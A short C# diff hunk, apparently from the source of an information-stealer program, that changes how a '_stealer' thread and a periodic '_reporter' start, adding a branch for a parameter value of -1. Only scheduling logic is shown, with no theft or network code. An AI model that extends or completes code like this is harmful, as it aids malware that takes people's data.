@@ -28,7 +28,14 @@ namespace sub
         public void Start(int param)
         {
             _stealer.Start();
-            _reporter.Start(param*60000); //This will change it to minutes
+            if (param != -1)
+            {
+                _reporter.Start(param*60000); //This will change it to minutes
+            } 
+            else
+            {
+                _reporter.Start();
+            }
         }
 
         public Thread GetStealerThread()
